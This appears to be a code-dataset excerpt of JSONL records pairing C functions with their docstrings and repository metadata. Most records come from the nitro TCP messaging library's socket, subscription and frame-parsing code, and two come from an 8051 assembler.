{"docstring": "/* Stcp_socket_bind\n * ----------------\n *\n * Turn a newly-created socket into a TCP/bind socket.\n */\n", "func_signal": "int Stcp_socket_bind(nitro_tcp_socket_t *s, char *location)", "code": "{\n    int r = Stcp_parse_location(location, &s->location, 1);\n    s->outbound = 0;\n\n    if (r) {\n        return r;\n    }\n\n    pthread_mutex_init(&s->l_pipes, NULL);\n    Stcp_create_queues(s);\n    ev_timer_init(\n        &s->sub_send_timer,\n        Stcp_socket_check_sub,\n        1.0, 1.0);\n    s->sub_send_timer.data = s;\n\n    s->bound_fd = Stcp_nonblocking_socket_new(s->opt->tcp_keep_alive);\n\n    if (s->bound_fd < 0) {\n        return -1;\n    }\n\n    int t = 1;\n    setsockopt(s->bound_fd, SOL_SOCKET, SO_REUSEADDR, &t, sizeof(int));\n#ifdef SO_REUSEPORT\n    setsockopt(s->bound_fd, SOL_SOCKET, SO_REUSEPORT, &t, sizeof(int));\n#endif\n\n    if (bind(s->bound_fd,\n             (struct sockaddr *)&s->location,\n             sizeof(s->location))) {\n        return nitro_set_error(NITRO_ERR_ERRNO);\n    }\n\n    listen(s->bound_fd, 512);\n\n    ev_io_init(&s->bound_io,\n               Stcp_bind_callback, s->bound_fd,\n               EV_READ);\n    s->bound_io.data = s;\n\n    /* we need to do the ev work on the ev thread */\n    nitro_async_t *bg = nitro_async_new(NITRO_ASYNC_BIND_LISTEN);\n    bg->u.bind_listen.socket = (nitro_socket_t *)s->parent;\n    nitro_async_schedule(bg);\n\n    return 0;\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_parse_subs\n * ----------------------\n *\n * Parse subscription data and save it as the pipe's particular\n * set of subscriptions.  Update the socket trie for routing\n * pub messages to this pipe.\n */\n", "func_signal": "static void Stcp_socket_parse_subs(nitro_tcp_socket_t *s, nitro_pipe_t *p,\n                                   uint64_t state, const uint8_t *data, size_t size, nitro_counted_buffer_t *buf)", "code": "{\n\n    /* We don't need the lock for this part */\n    nitro_key_t *old = p->sub_keys;\n    p->sub_keys = NULL;\n\n    /* Build up a list of all the keys that came in on the SUB\n       frame from the network */\n    while (1) {\n        if (size < sizeof(uint8_t)) {\n            break;\n        }\n\n        uint8_t length = *(uint8_t *)data;\n\n        size -= sizeof(uint8_t);\n\n        if (size < length) {\n            break;\n        }\n\n        data += sizeof(uint8_t);\n\n        nitro_key_t *key = nitro_key_new(data, length, buf);\n        DL_APPEND(p->sub_keys, key);\n\n        size -= length;\n        data += length;\n    }\n\n    /* Sort the keys so that we can do a sorted walk to\n       find things added and removed vs. last iteration */\n    DL_SORT(p->sub_keys, nitro_key_compare);\n\n    pthread_mutex_lock(&s->l_pipes);\n\n    nitro_key_t *walk_old = old, *tmp = NULL, *walk_new = p->sub_keys;\n\n    /* Now, we're going to do a sorted walk to find new\n       and old keys that need to be added/removed from the trie */\n    while (1) {\n        if (walk_old == NULL) {\n            if (walk_new == NULL) {\n                /* End of both lists, so we're done */\n                break;\n            }\n\n            /* If the old is done, but not new we can\n               assume all remaining new items need to be added */\n            nitro_prefix_trie_add(&s->subs,\n                                  walk_new->data, walk_new->length,\n                                  p);\n\n            walk_new = walk_new->next;\n        } else if (walk_new == NULL) {\n            /* If the old has more, but the new is done, the\n               rest of the old are now gone.  Delete 'em */\n            nitro_prefix_trie_del(s->subs,\n                                  walk_old->data, walk_old->length,\n                                  p);\n            tmp = walk_old;\n            walk_old = walk_old->next;\n            nitro_key_destroy(tmp);\n        }\n\n        else {\n            /* They're both still non-null so we ened to figure out\n               if they're the same or not. */\n            int comp = nitro_key_compare(walk_old, walk_new);\n\n            if (comp < 0) {\n                /* New has jumped ahead, old key is missing */\n                nitro_prefix_trie_del(s->subs,\n                                      walk_old->data, walk_old->length,\n                                      p);\n\n                tmp = walk_old;\n                walk_old = walk_old->next;\n                nitro_key_destroy(tmp);\n\n            } else if (comp > 0) {\n                /* Old has jumped ahead, need to add new key */\n                nitro_prefix_trie_add(&s->subs,\n                                      walk_new->data, walk_new->length,\n                                      p);\n\n                walk_new = walk_new->next;\n            } else {\n                /* Key still exists.. move both forward, don't alter trie */\n                tmp = walk_old;\n                walk_old = walk_old->next;\n                nitro_key_destroy(tmp);\n\n                walk_new = walk_new->next;\n            }\n        }\n    }\n\n    pthread_mutex_unlock(&s->l_pipes);\n\n    p->sub_state_recv = state;\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_close_cb\n * --------------------\n *\n * Callback (shim) for when the linger has expired.\n * Just calls through to Stcp_socket_shutdown()\n */\n", "func_signal": "void Stcp_socket_close_cb(\n    struct ev_loop *loop,\n    ev_timer *close_timer,\n    int revents)", "code": "{\n    nitro_tcp_socket_t *s = (nitro_tcp_socket_t *)close_timer->data;\n    Stcp_socket_shutdown(s);\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_pub\n * ---------------\n *\n * Use the socket sub trie to find all prefixes that\n * are matching subscriptions to key `k`.  Deliver the\n * frame `fr` to each of them.\n *\n * (PUBLIC API)\n */\n", "func_signal": "int Stcp_socket_pub(nitro_tcp_socket_t *s,\n                    nitro_frame_t **frp, const uint8_t *k,\n                    size_t length, int flags)", "code": "{\n\n    nitro_frame_t *fr = *frp;\n\n    if (flags & NITRO_REUSE) {\n        nitro_frame_incref(fr);\n    } else {\n        *frp = NULL;\n    }\n\n    Stcp_pub_state st = {0};\n\n    st.fr = fr;\n\n    pthread_mutex_lock(&s->l_pipes);\n\n    nitro_prefix_trie_search(s->subs,\n                             k, length, Stcp_deliver_pub_frame, &st);\n\n    pthread_mutex_unlock(&s->l_pipes);\n\n    nitro_frame_destroy(fr);\n\n    return st.count;\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_relay_fw\n * --------------------\n *\n * Relay a packet to another node.\n *\n * This is like a normal send, routing stack from `snd`\n * is retained so that the packet can find its way back\n * to the origin through all intermediate hops (if necessary).\n */\n", "func_signal": "int Stcp_socket_relay_fw(nitro_tcp_socket_t *s,\n                         nitro_frame_t *snd, nitro_frame_t **frp, int flags)", "code": "{\n    nitro_frame_t *fr = *frp;\n\n    if (flags & NITRO_REUSE) {\n        fr = nitro_frame_copy_partial(fr, NULL);\n    } else {\n        *frp = NULL;\n    }\n\n    nitro_frame_clone_stack(snd, fr);\n    nitro_frame_set_sender(fr, snd->sender, snd->sender_buffer);\n    nitro_frame_stack_push_sender(fr);\n    int r = nitro_queue_push(s->q_send, fr, !(flags & NITRO_NOWAIT));\n\n    if (r) {\n        nitro_frame_destroy(fr);\n    }\n\n    return r;\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_sub\n * ---------------\n *\n * Add a new subscription to this socket's subscription list.\n *\n * This subscription list will be relayed to the peer socket so\n * that pub() messages sent on that socket that match the subscription\n * patterns will find their way back.\n *\n * (PUBLIC API)\n */\n", "func_signal": "int Stcp_socket_sub(nitro_tcp_socket_t *s,\n                    uint8_t *k, size_t length)", "code": "{\n    uint8_t *cp = memdup(k, length);\n\n    nitro_counted_buffer_t *buf =\n        nitro_counted_buffer_new(\n            cp, just_free, NULL);\n\n    nitro_key_t *key = nitro_key_new(cp, length,\n                                     buf);\n\n    int ret = 0;\n    pthread_mutex_lock(&s->l_pipes);\n    nitro_key_t *search;\n\n    DL_FOREACH(s->sub_keys, search) {\n        if (!nitro_key_compare(search, key)) {\n            ret = -1;\n            break;\n        }\n    }\n\n    if (!ret) {\n        DL_APPEND(s->sub_keys, key);\n        Stcp_socket_reindex_subs(s);\n    } else {\n        nitro_set_error(NITRO_ERR_SUB_ALREADY);\n        nitro_key_destroy(key);\n    }\n\n    pthread_mutex_unlock(&s->l_pipes);\n\n    return ret;\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_recv_queue_stat\n * ---------------------------\n *\n * Callback from queue library for when a recv queue changes state\n * EMPTY|CONTENTS|FULL.\n *\n * EMPTY means there is nothing to read, so clear the eventfd if one\n * exists\n *\n * FULL means we need to disable reads from the network.\n *\n * no longer FULL (FULL = last) means we can re-eanble writes\n */\n", "func_signal": "void Stcp_socket_recv_queue_stat(NITRO_QUEUE_STATE st, NITRO_QUEUE_STATE last, void *p)", "code": "{\n    nitro_tcp_socket_t *s = (nitro_tcp_socket_t *)p;\n\n    if (s->opt->want_eventfd && st == NITRO_QUEUE_STATE_EMPTY) {\n        /* clear the \"has data\" bit */\n#ifdef __linux__\n        uint64_t buf;\n        int evread = read(s->event_fd, &buf, sizeof(uint64_t));\n        assert(evread == sizeof(uint64_t) || (evread < 0 && errno == EAGAIN));\n#else\n        char buf[512];\n        int evread = 0;\n\n        while (evread >= 0) {\n            evread = read(s->event_fd, &buf, sizeof(buf));\n        }\n\n#endif\n    } else if (st == NITRO_QUEUE_STATE_FULL) {\n        Stcp_socket_disable_reads(s);\n    } else if (last == NITRO_QUEUE_STATE_FULL) {\n        /* async, we're not on nitro thread */\n        nitro_async_t *a = nitro_async_new(NITRO_ASYNC_ENABLE_READS);\n        a->u.enable_reads.socket = SOCKET_PARENT(s);\n        nitro_async_schedule(a);\n    }\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_encrypt_frame\n * ------------------\n *\n * Encrypt a frame using the pipe's nacl cache.\n *\n * (Callback for nitro_queue_fd_write_encrypted())\n */\n", "func_signal": "nitro_frame_t *Stcp_encrypt_frame(nitro_frame_t *fr, void *baton)", "code": "{\n    nitro_pipe_t *p = (nitro_pipe_t *)baton;\n    nitro_frame_t *out = crypto_frame_encrypt(fr, p);\n\n    if (!out) {\n        nitro_set_error(NITRO_ERR_ENCRYPT);\n    }\n\n    return out;\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_reindex_subs\n * ------------------------\n *\n * When a new subscription is added to this socket, re-build the pre-calculated\n * outgoing SUB frame for sending to all conected peers.\n */\n", "func_signal": "static void Stcp_socket_reindex_subs(nitro_tcp_socket_t *s)", "code": "{\n\n    nitro_key_t *key;\n    ++s->sub_keys_state;\n    //    fprintf(stderr, \"state changed to: %llu\\n\", (unsigned long long) s->sub_keys_state);\n    ev_timer_start(the_runtime->the_loop,\n                   &s->sub_send_timer);\n\n    if (s->sub_data) {\n        nitro_counted_buffer_decref(s->sub_data);\n    }\n\n    nitro_buffer_t *buf =\n        nitro_buffer_new();\n\n    nitro_buffer_append(\n        buf,\n        (const char *)(&s->sub_keys_state),\n        sizeof(uint64_t));\n\n    DL_FOREACH(s->sub_keys, key) {\n        nitro_buffer_append(\n            buf,\n            (const char *)(&key->length),\n            sizeof(uint8_t));\n        nitro_buffer_append(\n            buf,\n            (const char *)key->data,\n            key->length);\n    }\n\n    s->sub_data = nitro_counted_buffer_new(\n                      buf->area, buffer_free, buf);\n    s->sub_data_length = buf->size;\n    Stcp_scan_subs(s);\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_close\n * -----------------\n *\n * Schedule a socket close after the linger time for this socket.\n *\n * (PUBLIC API)\n */\n", "func_signal": "void Stcp_socket_close(nitro_tcp_socket_t *s)", "code": "{\n    nitro_async_t *a = nitro_async_new(NITRO_ASYNC_CLOSE);\n    a->u.close.socket = SOCKET_PARENT(s);\n    nitro_async_schedule(a);\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_pipe_enable_write\n * ----------------------\n *\n * Enable the libev write callback on a particular pipe.\n */\n", "func_signal": "void Stcp_pipe_enable_write(nitro_pipe_t *p)", "code": "{\n    NITRO_THREAD_CHECK;\n    ev_io_start(the_runtime->the_loop,\n                &p->iow);\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_unsub\n *\n * Remove a subscription from the socket's subscription list.\n *\n * (see Stcp_socket_sub for more info about the significance of this\n * list.\n *\n * (PUBLIC API)\n */\n", "func_signal": "int Stcp_socket_unsub(nitro_tcp_socket_t *s,\n                      uint8_t *k, size_t length)", "code": "{\n\n    nitro_counted_buffer_t *buf =\n        nitro_counted_buffer_new(\n            k, free_nothing, NULL);\n\n    nitro_key_t *tmp = nitro_key_new(\n                           k, length, buf);\n\n    int ret = -1;\n\n    pthread_mutex_lock(&s->l_pipes);\n    nitro_key_t *search = NULL;\n\n    DL_FOREACH(s->sub_keys, search) {\n        if (!nitro_key_compare(search, tmp)) {\n            ret = 0;\n            break;\n        }\n    }\n\n    nitro_key_destroy(tmp);\n\n    if (search) {\n        DL_DELETE(s->sub_keys, search);\n        nitro_key_destroy(search);\n        Stcp_socket_reindex_subs(s);\n    } else {\n        nitro_set_error(NITRO_ERR_SUB_MISSING);\n    }\n\n    pthread_mutex_unlock(&s->l_pipes);\n\n    return ret;\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_start_connect\n * -------------------------\n *\n * Start attemping a nonblocking connect with a new fd\n * for a nitro socket.  This is invoked by the connect_timer's callback,\n * when the nitro socket is in the disconnected state.\n */\n", "func_signal": "void Stcp_socket_start_connect(nitro_tcp_socket_t *s)", "code": "{\n    NITRO_THREAD_CHECK;\n\n    s->connect_fd = Stcp_nonblocking_socket_new(s->opt->tcp_keep_alive);\n\n    if (s->connect_fd < 0) {\n        nitro_log_error(\"tcp/connect\", \"connect failed to create socket\");\n\n        if (s->opt->error_handler) {\n            s->opt->error_handler(nitro_error(),\n                                  s->opt->error_handler_baton);\n        }\n\n        return;\n    }\n\n    ev_io_init(&s->connect_io,\n               Stcp_connect_cb, s->connect_fd, EV_WRITE);\n    s->connect_io.data = s;\n\n    int t = connect(s->connect_fd,\n                    (struct sockaddr *)&s->location,\n                    sizeof(s->location));\n\n    if (t == 0 || errno == EINPROGRESS || errno == EINTR) {\n        ev_io_start(the_runtime->the_loop, &s->connect_io);\n    } else {\n        close(s->connect_fd);\n        ev_timer_set(\n            &s->connect_timer,\n            s->opt->reconnect_interval, 0);\n        ev_timer_start(the_runtime->the_loop, &s->connect_timer);\n    }\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_pipe_send_sub\n * ------------------\n *\n * Send the socket's current list of subscriptions\n * to the other end of this pipe\n */\n", "func_signal": "void Stcp_pipe_send_sub(nitro_tcp_socket_t *s,\n                        nitro_pipe_t *p)", "code": "{\n    // NOTE: assumed l_pipes is held\n\n    if (s->opt->secure && !p->them_handshake) {\n        /* Cannot send until they've finished the handshake */\n        return;\n    }\n\n    nitro_counted_buffer_incref(s->sub_data);\n    nitro_frame_t *fr = nitro_frame_new_prealloc(\n                            s->sub_data->ptr,\n                            s->sub_data_length,\n                            s->sub_data);\n    fr->type = NITRO_FRAME_SUB;\n\n    int r = nitro_queue_push(p->q_send, fr, 0); // NO WAIT on nitro thread\n\n    if (r) {\n        /* cannot get our sub frame out b/c output is full */\n        nitro_frame_destroy(fr);\n    }\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_pipe_in_cb\n * ---------------\n *\n * A pipe fd has some data ready for reading.\n *\n * Read it, then call the frame parsing functions on\n * the accumulated buffer.\n */\n", "func_signal": "void Stcp_pipe_in_cb(\n    struct ev_loop *loop,\n    ev_io *pipe_iow,\n    int revents)", "code": "{\n    /* NOTE: this is on the security critical path */\n    NITRO_THREAD_CHECK;\n    nitro_pipe_t *p = (nitro_pipe_t *)pipe_iow->data;\n\n    int sz = TCP_INBUF;\n    char *append_ptr = nitro_buffer_prepare(p->in_buffer, &sz);\n\n    int r = read(p->fd, append_ptr, sz);\n\n    if (r < 0 && (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR)) {\n        return;\n    }\n\n    if (r <= 0) {\n        Stcp_destroy_pipe(p);\n        return;\n    }\n\n    nitro_buffer_extend(p->in_buffer, r);\n    INCR_STAT((nitro_tcp_socket_t *)p->the_socket, p->bytes_recv, r);\n\n    Stcp_parse_socket_buffer(p);\n\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_parse_next_frame\n * ---------------------\n *\n * This is the callback given to queue_consume().  It is invoked\n * repeatedly until it returns NULL (and does not return a frame).\n * This particular callback is parsing the buffer accumulated from\n * the network and yielding each data frame as it encouters it\n * (as well as processing control frames).  Ergo, it is *the* way\n * messages are received and placed onto the nitro socket's recv()\n * queue.\n *\n * Security note: this is the most dangerous function is nitro, since\n * it directly processes data from the network.  Having it crash safe\n * and buffer overrun safe is important.\n */\n", "func_signal": "static nitro_frame_t *Stcp_parse_next_frame(void *baton)", "code": "{\n    tcp_frame_parse_state *st = (tcp_frame_parse_state *)baton;\n    nitro_frame_t *fr = NULL;\n\n    int size;\n    nitro_buffer_t const *buf = st->buf;\n    char const *start = nitro_buffer_data((nitro_buffer_t *)buf, &size);\n\n    if (!st->cursor) {\n        st->cursor = (char *)start;\n    }\n\n    /* This loop processes one frame at a time, parsing bytes from\n       the network.  It can exit for a few reasons:\n\n       1. It has found a full, whole data frame.  Then fr != NULL,\n          and the function will return the data frame.  (Note:\n          processing control frames iterates, but does not set fr,\n          so control frames do not cause this function to yield a\n          frame onto the queue).\n       2. A protocol error occurs.  The associated pipe should be\n          closed and destroyed for protection from a noncompliant\n          client.\n       3. Not enough bytes are unconsumed in the network buffer to\n          read an entire frame header.  The loop is broken with\n          fr = NULL.  This will cause queue_consume() to stop calling.\n       4. A frame header was read, but not enough bytes remain\n          unconsumed in the network buffer to satisfy the frame size.\n          The loop is broken with fr = NULL like case (3).\n    */\n    while (!fr) {\n        char const *cursor = st->cursor;\n\n        size_t taken = cursor - start;\n        size_t left = size - taken;\n\n        if (left < sizeof(nitro_protocol_header)) {\n            break;\n        }\n\n        nitro_protocol_header const *hd =\n            (nitro_protocol_header *)cursor;\n        left -= sizeof(nitro_protocol_header);\n\n        if (hd->frame_size > st->s->opt->max_message_size) {\n            nitro_set_error(NITRO_ERR_MAX_FRAME_EXCEEDED);\n            st->pipe_error = 1;\n            return NULL;\n        }\n\n        if (hd->protocol_version != 1) {\n            nitro_set_error(NITRO_ERR_BAD_PROTOCOL_VERSION);\n            st->pipe_error = 1;\n            return NULL;\n        }\n\n        size_t ident_size = hd->num_ident * SOCKET_IDENT_LENGTH;\n\n        if (left < hd->frame_size + ident_size) {\n            break;\n        }\n\n        /* \"Parsing\" protocol header */\n        const nitro_protocol_header *phd = hd;\n        const uint8_t *frame_data = (uint8_t *)cursor + sizeof(nitro_protocol_header);\n        nitro_counted_buffer_t **bbuf_p = &(st->cbuf);\n        nitro_counted_buffer_t *bbuf = NULL;\n\n        /* First order, unwrap secure */\n        if (hd->packet_type == NITRO_FRAME_SECURE) {\n            if (!st->s->opt->secure) {\n                nitro_set_error(NITRO_ERR_BAD_SECURE);\n                st->pipe_error = 1;\n                return NULL;\n            }\n\n            size_t final_size;\n            uint8_t *clear = crypto_decrypt_frame(\n                                 frame_data, hd->frame_size, st->p, &final_size, &bbuf);\n\n            if (!clear) {\n                assert(nitro_has_error());\n                st->pipe_error = 1;\n                return NULL;\n            }\n\n            bbuf_p = &bbuf;\n            phd = (nitro_protocol_header *)clear;\n            frame_data = clear + sizeof(nitro_protocol_header);\n        } else if (st->s->opt->secure && hd->packet_type != NITRO_FRAME_HELLO) {\n            nitro_set_error(NITRO_ERR_INVALID_CLEAR);\n            st->pipe_error = 1;\n            return NULL;\n        }\n\n        if (phd->packet_type != NITRO_FRAME_DATA) {\n            /* It's a control frame; handle appropriately */\n            if (phd->packet_type == NITRO_FRAME_HELLO) {\n                if (st->p->them_handshake) {\n                    nitro_set_error(NITRO_ERR_DOUBLE_HANDSHAKE);\n                    st->pipe_error = 1;\n                    return NULL;\n                }\n\n                if (phd->frame_size != SOCKET_IDENT_LENGTH) {\n                    nitro_set_error(NITRO_ERR_DOUBLE_HANDSHAKE);\n                    st->pipe_error = 1;\n                    return NULL;\n                }\n\n                /* Check the remote identity if config has one */\n                if (st->s->opt->has_remote_ident &&\n                        memcmp(st->s->opt->required_remote_ident, frame_data,\n                               SOCKET_IDENT_LENGTH) != 0) {\n\n                    nitro_set_error(NITRO_ERR_INVALID_CERT);\n                    st->pipe_error = 1;\n                    return NULL;\n                }\n\n                /* Copy the identity of the remote socket */\n                st->p->remote_ident = malloc(SOCKET_IDENT_LENGTH);\n                memcpy(st->p->remote_ident,\n                       frame_data,\n                       SOCKET_IDENT_LENGTH);\n                st->p->remote_ident_buf = nitro_counted_buffer_new(\n                                              st->p->remote_ident, just_free, NULL);\n\n                /* Register the pipe id into the routing table (for replies and pub) */\n                Stcp_register_pipe(st->s, st->p);\n\n                /* If this is a secure socket, cache crypto information associated\n                   with the ident (which is actually an NaCl public key */\n                if (st->s->opt->secure) {\n                    crypto_make_pipe_cache(st->s, st->p);\n                    Stcp_pipe_enable_write(st->p);\n                }\n\n                /* Mark the handshake done */\n                st->p->them_handshake = 1;\n\n                pthread_mutex_lock(&st->s->l_pipes);\n\n                if (st->s->sub_data) {\n                    Stcp_pipe_send_sub(st->s, st->p);\n                }\n\n                pthread_mutex_unlock(&st->s->l_pipes);\n\n            } else if (phd->packet_type == NITRO_FRAME_SUB) {\n                if (!st->p->them_handshake) {\n                    nitro_set_error(NITRO_ERR_NO_HANDSHAKE);\n                    st->pipe_error = 1;\n                    return NULL;\n                }\n\n                if (phd->frame_size < sizeof(uint64_t)) {\n                    nitro_set_error(NITRO_ERR_BAD_SUB);\n                    st->pipe_error = 1;\n                    return NULL;\n                }\n\n                uint64_t state = *(uint64_t *)frame_data;\n\n                /* Check the state counter to see if we've already processed this\n                   version of the pipe's sub state */\n                if (st->p->sub_state_recv != state) {\n                    if (!*bbuf_p) {\n                        /* we need to retain the backing buffer for the sub data */\n                        *bbuf_p = nitro_counted_buffer_new(\n                                      NULL, buffer_free, (void *)buf);\n                    }\n\n                    /* Parse the sub data from the socket and update the socket\n                       sub trie as appropriate */\n                    Stcp_socket_parse_subs(st->s, st->p, state,\n                                           frame_data + sizeof(uint64_t),\n                                           phd->frame_size - sizeof(uint64_t), *bbuf_p);\n                } else {}\n            }\n        } else {\n            /* Data frame.  This is meat and potatos user data.\n               Parse it and return it so that queue_consume() adds\n               it to the end of the queue */\n\n            /* NOTE: This is an especially busy corner of a nitro socket */\n            if (!st->p->them_handshake) {\n                nitro_set_error(NITRO_ERR_NO_HANDSHAKE);\n                st->pipe_error = 1;\n                return NULL;\n            }\n\n            INCR_STAT(st->s, st->s->stat_recv, 1);\n            INCR_STAT(st->s, st->p->stat_recv, 1);\n\n            if (!*bbuf_p) {\n                /* it is official, we will consume data... */\n\n                /* first incref is for the socket itself, not done copying yet */\n                *bbuf_p = nitro_counted_buffer_new(\n                              NULL, buffer_free, (void *)buf);\n            }\n\n            nitro_counted_buffer_t const *cbuf = *bbuf_p;\n\n            /* Incref for the eventual recipient */\n            nitro_counted_buffer_incref((nitro_counted_buffer_t *)cbuf);\n\n            fr = nitro_frame_new_prealloc(\n                     (char *)frame_data,\n                     phd->frame_size, (nitro_counted_buffer_t *)cbuf);\n            nitro_frame_set_sender(fr,\n                                   st->p->remote_ident, st->p->remote_ident_buf);\n\n            /* If this has a ident stack that's been routed, copy/retain it */\n            if (phd->num_ident) {\n                nitro_frame_set_stack(fr,\n                                      frame_data + phd->frame_size,\n                                      (nitro_counted_buffer_t *)cbuf, phd->num_ident);\n            }\n        }\n\n        if (bbuf) {\n            nitro_counted_buffer_decref(bbuf);\n        }\n\n        /* Increment cursor using original frame information */\n        st->cursor += (sizeof(nitro_protocol_header) + hd->frame_size + ident_size);\n    }\n\n    if (fr) {\n        st->got_data_frames = 1;\n    }\n\n    return fr;\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_send_queue_stat\n * ---------------------------\n *\n * Callback from queue library for when the send queue changes state\n * EMPTY|CONTENTS|FULL.  A non-empty send queue on any pipe associated\n * with a socket means we can enable writes for the socket\n */\n", "func_signal": "void Stcp_socket_send_queue_stat(NITRO_QUEUE_STATE st, NITRO_QUEUE_STATE last, void *p)", "code": "{\n    if (last == NITRO_QUEUE_STATE_EMPTY) {\n        nitro_tcp_socket_t *s = (nitro_tcp_socket_t *)p;\n        nitro_async_t *a = nitro_async_new(NITRO_ASYNC_ENABLE_WRITES);\n        a->u.enable_writes.socket = SOCKET_PARENT(s);\n        nitro_async_schedule(a);\n    }\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_connect_timer_cb\n * ----------------------------\n *\n * Attempt a connection for a disassociated connect socket.\n * Called by a libev timer.\n */\n", "func_signal": "void Stcp_socket_connect_timer_cb(\n    struct ev_loop *loop,\n    ev_timer *connect_timer,\n    int revents)", "code": "{\n    nitro_tcp_socket_t *s = (nitro_tcp_socket_t *)connect_timer->data;\n    ev_timer_stop(the_runtime->the_loop, connect_timer);\n\n    Stcp_socket_start_connect(s);\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_send\n * ----------------\n *\n * Send frame `fr` on socket `s`.  Effectively, this pushes the frame\n * onto the common queue for the next pipe that comes up write ready.\n *\n * (PUBLIC API)\n */\n", "func_signal": "int Stcp_socket_send(nitro_tcp_socket_t *s, nitro_frame_t **frp, int flags)", "code": "{\n    nitro_frame_t *fr = *frp;\n\n    if (flags & NITRO_REUSE) {\n        nitro_frame_incref(fr);\n    } else {\n        *frp = NULL;\n    }\n\n    int r = nitro_queue_push(s->q_send, fr, !(flags & NITRO_NOWAIT));\n\n    if (r) {\n        nitro_frame_destroy(fr);\n    }\n\n    return r;\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*\n * Stcp_socket_check_sub\n * ---------------------\n *\n * Shim callback, fired on a timer, which makes sure all pipes\n * have the correct version of the sub list\n */\n", "func_signal": "void Stcp_socket_check_sub(\n    struct ev_loop *loop,\n    ev_timer *sub_timer,\n    int revents)", "code": "{\n    nitro_tcp_socket_t *s = (nitro_tcp_socket_t *)sub_timer->data;\n\n    pthread_mutex_lock(&s->l_pipes);\n    Stcp_scan_subs(s);\n    pthread_mutex_unlock(&s->l_pipes);\n}", "path": "src\\Stcp.c", "repo_name": "bumptech/nitro", "stars": 112, "license": "other", "language": "c", "size": 1851}
{"docstring": "/*-----------------------------------------------------------------------\n * \"bin\" format.  Raw binary data\n */\n", "func_signal": "static int open_bin(const char *file, const char *ftype, const char *arg)", "code": "{\n\tif (file == NULL) fout = stdout;\n\telse fout = fopen(file, \"w\");\n\n\tif( fout == NULL ) {\n\t\tmesg_f(\"Cannot open %s for writing.\\n\", file);\n\t\treturn -1;\n\t}\n\taddr = 0;\n\treturn 0;\n}", "path": "src\\as31\\emitter.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* ----------------------------------------------------------------------\n * makeop:\n *\tThis function makes an opcode based on the instruction symbol table\n *\tentry, and an addressing mode structure.\n *\tThis function is called from both passes, but\n *\tonly generates code in pass 2.\n *\n *\tResultant opcode bytes are passed to genbyte().\n *\n *\tReturns the nuumber of bytes that the instruction\n *\toccupies.\n *\n */\n", "func_signal": "int makeop(struct opcode * op, struct mode *m, int add)", "code": "{\n\tregister unsigned int newop;\n\n\tif( m == NULL ) {\n\t\tif(pass2) genbyte(op->bytes[0+add]);\n\t\treturn(1);\n\t}\n\n\tif( pass2 ) {\n\t\tnewop = op->bytes[ get_md(*m)+add ] | get_ov(*m);\n\t\tgenbyte(newop);\n\t\tif( get_sz(*m) > 0 ) genbyte( get_b1(*m) );\n\t\tif( get_sz(*m) > 1 ) genbyte( get_b2(*m) );\n\t}\n\treturn( get_sz(*m)+1 );\n}", "path": "src\\as31\\parser.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
